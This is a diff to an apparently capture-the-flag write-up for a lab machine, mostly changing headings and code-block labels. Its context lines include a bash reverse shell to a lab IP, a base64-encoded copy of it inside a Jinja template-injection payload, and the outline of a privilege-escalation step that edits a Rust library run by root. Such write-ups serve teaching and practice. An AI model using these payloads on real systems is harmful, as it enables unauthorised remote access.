@@ -242,6 +242,7 @@ Now we will do the same thing of modifying the username, generating the key, etc
 The reason we base64 the reverse shell is that certain characters are not allowed for the username in PGP keys
 
 * encode the shell to base64
+
 ```bash
 echo "bash -c 'bash -i >& /dev/tcp/10.10.14.173/4444 0>&1'" | base64
 ```
@@ -252,7 +253,7 @@ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.173/4444 0>&1'" | base64
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzMvNDQ0NCAwPiYxJwo= | base64 -d | bash').read() }}
 ```
 
-## Lateral movement: atlas –> silentobserver
+## atlas –> silentobserver
 
 ### Enumeration :
 
@@ -345,7 +346,7 @@ silentobserver@sandworm:~$ cat user.txt
 0646b5ff************************
 ```
 
-## Lateral movement: silentobserver –> atlas
+## silentobserver –> atlas
 
 Searching for SUID binaries, we found one that doesn't seem common.
 
@@ -370,7 +371,7 @@ silentobserver@sandworm:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/fusermount3
 ```
 
-### lib.rs :
+### lib.rs
 By running pspy, we can deduce that the routine launched every two minutes is executed by root but as the user `atlas`, that it is Rust, and that the folder to target is `/opt/crates`
 
 ![Alt text](pspy64-1.png)
@@ -391,7 +392,7 @@ silentobserver@sandworm:/opt/crates/logger/src$
 
 Essentially, the code interacts with a database using upstream to pull and manipulate files. Notably, it uses an external library: extern crate logger. What makes this interesting is that the library is not imported from the internet but from the machine itself. So, it must be located within the project. After a brief search, we find it at the path: `/opt/crates/logger/src`
 
-```Rust
+```bash
 extern crate chrono;
 
 use std::fs::OpenOptions;
@@ -433,7 +434,7 @@ The exploitation involves modifying `/opt/crates/logger/src/lib.rs` to copy `/bi
 
 ### Modifing lib.rs 
 
-```Rust
+```bash
 extern crate chrono;
 
 use std::fs::{self, OpenOptions};
